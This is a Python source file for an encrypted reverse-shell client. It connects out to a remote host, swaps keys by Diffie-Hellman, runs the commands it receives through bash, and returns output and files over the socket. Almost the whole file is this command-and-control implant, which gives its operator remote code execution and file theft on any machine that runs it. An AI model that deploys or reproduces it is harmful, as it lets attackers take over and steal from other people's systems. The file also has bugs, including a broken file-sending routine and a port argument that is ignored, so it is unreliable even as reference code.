from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import serialization, padding, hashes
from cryptography.hazmat.primitives.asymmetric import dh
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.backends import default_backend
from utils import NO_OUTPUT_SIGNAL
import subprocess
import argparse
import logging
import select
import socket
import json
import time
import os

logging.basicConfig(level=None)

# Constants
SENDING_FILE = b"sendingfile"
GETTING_FILE = b"gettingfile"

class Shell:
    def __init__(self):
        self.end_marker = "END_OF_COMMAND" # TODO: This shouldnt be needed

    def execute_command(self, command):
        completed_process = subprocess.run(["/bin/bash", "-c", command],
                                           stdout=subprocess.PIPE,
                                           stderr=subprocess.PIPE)

        return completed_process.stdout, completed_process.stderr

    def read_output(self):
        out, err = b"", b""
        while True:
            reads = [self.proc.stdout.fileno(), self.proc.stderr.fileno()]
            ret = select.select(reads, [], [], 0.1)

            for fd in ret[0]:
                if fd == self.proc.stderr.fileno():
                    err += self.proc.stderr.read1()
                if fd == self.proc.stdout.fileno():
                    chunk = self.proc.stdout.read1()
                    out += chunk
                    if self.end_marker.encode() in chunk:
                        return out[:-len(self.end_marker)], err

class Encryption():
    def __init__(self):
        self.parameters = None
        self.derived_key = None

    def get_params(self, s):
        parameters_json = s.recv(1024)
        parameters_dict = json.loads(parameters_json.decode())
        p = parameters_dict['p']
        g = parameters_dict['g']
        return dh.DHParameterNumbers(p, g).parameters(default_backend())
    
    def get_derived_key(self, parameters, socket):
        client_private_key = parameters.generate_private_key()

        client_public_key_pem = client_private_key.public_key().public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
        socket.send(client_public_key_pem)

        server_public_key_pem = socket.recv(1024)
        server_public_key = serialization.load_pem_public_key(server_public_key_pem)
        shared_key = client_private_key.exchange(server_public_key)
        return HKDF(
                algorithm=hashes.SHA256(),
                length=32,
                salt=None,
                info=b'handshake data',
            ).derive(shared_key)

    def encrypt_message(self, data, derived_key):
            iv = os.urandom(12)
            cipher = Cipher(algorithms.AES(derived_key), modes.GCM(iv), backend=default_backend())
            encryptor = cipher.encryptor()
            padder = padding.PKCS7(128).padder()
            padded_message = padder.update(data) + padder.finalize()
            ciphertext = encryptor.update(padded_message) + encryptor.finalize()
            tag = encryptor.tag
            message = iv + ciphertext + tag
            message_length = len(message)
            return message_length, message

    def decrypt_message(self, data, derived_key):
        iv = data[:12]  # GCM uses a 12-byte IV
        ciphertext = data[12:-16]  # assuming a 16-byte tag
        tag = data[-16:]

        # Create an AES Cipher context with the derived key and the received IV
        cipher = Cipher(algorithms.AES(derived_key), modes.GCM(iv, tag), backend=default_backend())
        decryptor = cipher.decryptor()

        # Decrypt the ciphertext and remove the padding
        decrypted_message = decryptor.update(ciphertext) + decryptor.finalize()
        unpadder = padding.PKCS7(128).unpadder()
        return unpadder.update(decrypted_message) + unpadder.finalize()


class NetManager:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        while True:
            try:
                self.socket = self.connect_to_host()
            except ConnectionRefusedError:
                time.sleep(1)
                continue
            break
        self.shell = Shell()
        self.enc = Encryption()

    def connect_to_host(self):
        """Establishes a connection to the host."""
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.host, self.port))
        return s

    def receive_file(self, filename):
        """Receives a file from the socket and writes it to the local system."""
        with open(filename, "wb") as f:
            self.socket.sendall(b"0")
            while (data := self.socket.recv(1024)):
                f.write(data)

    def send_file(self, filename):
        """Reads a file from the local system and sends it through the socket."""
        with open(filename, "rb") as f:
            self.send_response(f.read(), len(f.read()))

    def change_directory(self, cmd, folder):
        try:
            os.chdir(folder)
            stdout_value = NO_OUTPUT_SIGNAL.encode()
        except FileNotFoundError:
            stdout_value = f"error: {folder} not found".encode()
        finally:
            message_length = len(stdout_value)
            self.socket.sendall(message_length.to_bytes(4, byteorder="big"))
            self.socket.sendall(stdout_value)

    def handle_file_transfers(self, data):
        """Handles file transfers based on the received data."""
        if data.decode().split(" ")[0] == "cd":
            cmd = data.decode().split(" ")[0]
            folder = data.decode().split(" ")[1]
            self.change_directory(cmd, folder)
            return True
        if SENDING_FILE in data:
            file = data.decode().split("sendingfile/")[1].split(" &&")[0].strip()
            self.receive_file(file)
            return True
        if GETTING_FILE in data:
            file = data.decode().split("gettingfile/")[1].split(" &&")[0].strip()
            self.send_file(file)
            return True
        return False

    def execute_command(self, data):
        """Executes a command and sends the response back through the socket."""
        stdout_value, stderr_value = self.shell.execute_command(data.decode("utf-8"))
        msg = f"{stdout_value.decode()}{stderr_value.decode()}".encode()
        self.send_response(msg, self.enc)

    def send_response(self, data, encryption):
        if len(data) > 0:
            message_length, message = encryption.encrypt_message(data, encryption.derived_key)
            self.socket.sendall(message_length.to_bytes(4, byteorder="big"))
            self.socket.sendall(message)
        else:
            message_length, message = encryption.encrypt_message(NO_OUTPUT_SIGNAL.encode(), encryption.derived_key)
            self.socket.sendall(message_length.to_bytes(4, byteorder="big"))
            self.socket.sendall(message)

    def netloop(self):
        self.enc.parameters = self.enc.get_params(self.socket)

        while True:
            self.enc.derived_key = self.enc.get_derived_key(self.enc.parameters, self.socket)
            data = self.socket.recv(1024)
            # print(data)
            if not data:
                break
            message = self.enc.decrypt_message(data, self.enc.derived_key)
            if self.handle_file_transfers(message):
                continue
            try:
                self.execute_command(message)
            except BrokenPipeError:
                logging.error("Connection closed by the host.")
                break

def main():
    """Main function to parse arguments and start execution."""
    parser = argparse.ArgumentParser()
    parser.add_argument("host")
    parser.add_argument("port", type=int)

    args = parser.parse_args()
    net_manager = NetManager(args.host, 4242)
    net_manager.netloop()


if __name__ == "__main__":
    main()